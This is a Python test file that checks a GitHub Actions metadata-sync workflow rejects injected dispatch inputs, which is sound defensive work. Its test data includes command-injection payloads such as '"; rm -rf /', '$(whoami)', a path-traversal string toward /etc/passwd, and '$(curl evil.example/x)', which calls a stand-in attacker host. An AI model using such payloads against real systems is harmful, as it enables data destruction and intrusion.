"""Static / behavioral regression tests for github-metadata-sync.yml's
dispatch-input handling.

R8 of the Phase 3 workstream A audit calls out `github-metadata-sync.yml`
dispatch input injection. All `workflow_dispatch` inputs already enter the
job's shell only through step `env:` (never raw `${{ github.event.inputs.* }}`
interpolation inside a `run:` body), and are only ever used as quoted shell
variables or inside quoted bash arrays (`"${args[@]}"`), so classic
command-injection via `; rm -rf /` style payloads is not reachable. These
tests lock that in and additionally verify the strict allowlist validation
added for `target` (must be one of `all`/`canary`/`cohort-1`/`repo`), for
`repo` (must match a conservative repo-slug charset), and for the two
boolean-shaped inputs (`apply`, `include_custom_properties`, expressed as the
literal strings `"true"`/`"false"`).

The `run:` scripts are extracted directly from the workflow YAML (not
duplicated by hand) so these tests fail loudly if the workflow drifts out of
sync with what is exercised here. The trailing `python
scripts/github/sync-github-metadata.py ...` invocation is replaced with a
stand-in `echo` so the tests only exercise the shell-side validation, not the
real GitHub API call plumbing (covered separately by
test_sync_github_metadata.py).
"""

from __future__ import annotations

import re
import shutil
import subprocess
import sys
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent.parent
WORKFLOW_PATH = ROOT / ".github" / "workflows" / "github-metadata-sync.yml"

_SYNC_INVOCATION_RE = re.compile(
    r"python scripts/github/sync-github-metadata\.py.*$", re.MULTILINE
)


def _load_workflow() -> dict:
    return yaml.safe_load(WORKFLOW_PATH.read_text(encoding="utf-8"))


def _step_run(job: str, step_name: str) -> str:
    workflow = _load_workflow()
    for step in workflow["jobs"][job]["steps"]:
        if step.get("name") == step_name:
            return step["run"]
    raise AssertionError(f"step {step_name!r} not found in job {job!r}")


def _stubbed(run_script: str) -> str:
    """Swap the real `sync-github-metadata.py` invocation for a stand-in echo
    of the computed argv, so tests exercise only the validation shell logic.
    """
    stubbed, count = _SYNC_INVOCATION_RE.subn('echo "ARGS: ${args[*]}"', run_script)
    assert count == 1, "expected exactly one sync-github-metadata.py invocation to stub out"
    return stubbed


def _run(script: str, env: dict[str, str]) -> subprocess.CompletedProcess:
    bash = shutil.which("bash") or "bash"
    if sys.platform.startswith("win"):
        for candidate in (
            Path("C:/Program Files/Git/bin/bash.exe"),
            Path("C:/Program Files/Git/usr/bin/bash.exe"),
        ):
            if candidate.is_file():
                bash = str(candidate)
                break
    return subprocess.run(
        [bash, "-c", script],
        env=env,
        capture_output=True,
        text=True,
        timeout=10,
    )


class GenerateSyncPlanTest(unittest.TestCase):
    """`plan` job / "Generate sync plan artifact" step."""

    def setUp(self) -> None:
        self.script = _stubbed(_step_run("plan", "Generate sync plan artifact"))

    def _env(self, target: str, repo: str = "", include_custom_properties: str = "true") -> dict[str, str]:
        return {
            "PATH": "/usr/bin:/bin",
            "EVENT_NAME": "workflow_dispatch",
            "APPLY_INPUT": "false",
            "TARGET_INPUT": target,
            "REPO_INPUT": repo,
            "INCLUDE_CUSTOM_PROPERTIES_INPUT": include_custom_properties,
        }

    def test_all_target_is_accepted(self) -> None:
        result = _run(self.script, self._env("all"))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--all", result.stdout)

    def test_canary_cohort_is_accepted(self) -> None:
        result = _run(self.script, self._env("canary"))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--cohort canary", result.stdout)

    def test_valid_repo_slug_is_accepted(self) -> None:
        result = _run(self.script, self._env("repo", "alembiq"))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--repo alembiq", result.stdout)

    def test_no_custom_properties_flag_set_when_false(self) -> None:
        result = _run(self.script, self._env("all", include_custom_properties="false"))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--no-custom-properties", result.stdout)

    def test_unknown_target_is_rejected_not_silently_defaulted(self) -> None:
        # Regression: an unrecognized target used to silently fall through to
        # --all instead of failing. It must now be rejected outright.
        result = _run(self.script, self._env("bogus-target"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("Unsupported target", result.stdout)

    def test_command_substitution_target_is_rejected(self) -> None:
        result = _run(self.script, self._env("$(whoami)"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("Unsupported target", result.stdout)

    def test_repo_missing_when_target_is_repo_is_rejected(self) -> None:
        result = _run(self.script, self._env("repo", ""))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("repo input is required", result.stdout)

    def test_command_injection_payload_in_repo_is_rejected(self) -> None:
        result = _run(self.script, self._env("repo", '"; rm -rf /; echo pwned'))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must be a valid repo slug", result.stdout)

    def test_path_traversal_payload_in_repo_is_rejected(self) -> None:
        result = _run(self.script, self._env("repo", "../../etc/passwd"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must be a valid repo slug", result.stdout)

    def test_shell_metacharacters_in_repo_are_rejected(self) -> None:
        for payload in ["repo`whoami`", "repo$(id)", "repo;id", "repo|id", "repo&&id", "repo\nid"]:
            with self.subTest(payload=payload):
                result = _run(self.script, self._env("repo", payload))
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("must be a valid repo slug", result.stdout)

    def test_non_boolean_custom_properties_value_is_rejected(self) -> None:
        result = _run(self.script, self._env("all", include_custom_properties="maybe"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must resolve to true or false", result.stdout)

    def test_non_boolean_apply_value_is_rejected(self) -> None:
        env = self._env("canary")
        env["APPLY_INPUT"] = "maybe"
        result = _run(self.script, env)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("apply must resolve to true or false", result.stdout)

    def test_non_dispatch_event_uses_advisory_defaults(self) -> None:
        env = self._env("", include_custom_properties="")
        env.update(EVENT_NAME="pull_request", APPLY_INPUT="")
        result = _run(self.script, env)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("--all", result.stdout)
        self.assertNotIn("--no-custom-properties", result.stdout)


class ApplyMetadataTest(unittest.TestCase):
    """`apply` job / "Apply metadata" step (and its paired token-validation step)."""

    def setUp(self) -> None:
        self.token_script = _step_run("apply", "Validate sync token is available")
        self.apply_script = _stubbed(_step_run("apply", "Apply metadata"))

    def _token_env(self, target: str, repo: str = "", gh_token: str = "token") -> dict[str, str]:
        return {
            "PATH": "/usr/bin:/bin",
            "TARGET_INPUT": target,
            "REPO_INPUT": repo,
            "GH_TOKEN": gh_token,
        }

    def _apply_env(self, target: str, repo: str = "", include_custom_properties: str = "true") -> dict[str, str]:
        return {
            "PATH": "/usr/bin:/bin",
            "TARGET_INPUT": target,
            "REPO_INPUT": repo,
            "INCLUDE_CUSTOM_PROPERTIES_INPUT": include_custom_properties,
        }

    def test_token_validation_rejects_unsupported_target(self) -> None:
        result = _run(self.token_script, self._token_env("bogus"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("Apply mode only supports", result.stdout)

    def test_token_validation_rejects_missing_token(self) -> None:
        result = _run(self.token_script, self._token_env("canary", gh_token=""))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("ALAWEIN_METADATA_SYNC_TOKEN is required", result.stdout)

    def test_token_validation_rejects_hostile_repo_slug(self) -> None:
        result = _run(self.token_script, self._token_env("repo", '"; rm -rf /'))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must be a valid repo slug", result.stdout)

    def test_apply_metadata_rejects_unsupported_target(self) -> None:
        result = _run(self.apply_script, self._apply_env("all"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("Apply mode only supports", result.stdout)

    def test_apply_metadata_accepts_valid_repo_slug(self) -> None:
        result = _run(self.apply_script, self._apply_env("repo", "alembiq"))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--repo alembiq", result.stdout)

    def test_apply_metadata_rejects_hostile_repo_slug(self) -> None:
        result = _run(self.apply_script, self._apply_env("repo", "$(curl evil.example/x)"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must be a valid repo slug", result.stdout)

    def test_apply_metadata_rejects_non_boolean_custom_properties(self) -> None:
        result = _run(self.apply_script, self._apply_env("canary", include_custom_properties="1"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must resolve to true or false", result.stdout)


class DispatchInputsNeverInterpolatedDirectlyTest(unittest.TestCase):
    """Static check: no `run:` step may interpolate a raw
    `${{ github.event.inputs.* }}` (or bare `inputs.*`) expression directly
    into its script body. Every dispatch input must be threaded through
    `env:` first, so the shell only ever sees it as a quoted variable.
    """

    def test_no_raw_dispatch_input_interpolation_in_run_blocks(self) -> None:
        workflow = _load_workflow()
        offenders = []
        for job_name, job in workflow["jobs"].items():
            for step in job.get("steps", []):
                run = step.get("run")
                if not run:
                    continue
                if re.search(r"\$\{\{\s*(github\.event\.)?inputs\.", run):
                    offenders.append(f"{job_name}/{step.get('name')}")
        self.assertEqual(offenders, [], f"raw dispatch-input interpolation found in: {offenders}")

    def test_validation_receives_uncoerced_dispatch_inputs(self) -> None:
        plan = next(step for step in _load_workflow()["jobs"]["plan"]["steps"]
                    if step.get("name") == "Generate sync plan artifact")
        for field in ("TARGET_INPUT", "APPLY_INPUT", "INCLUDE_CUSTOM_PROPERTIES_INPUT"):
            self.assertIsNotNone(re.fullmatch(r"\$\{\{\s*github\.event\.inputs\.[a-z_]+\s*\}\}", plan["env"].get(field, "")))


if __name__ == "__main__":
    unittest.main()
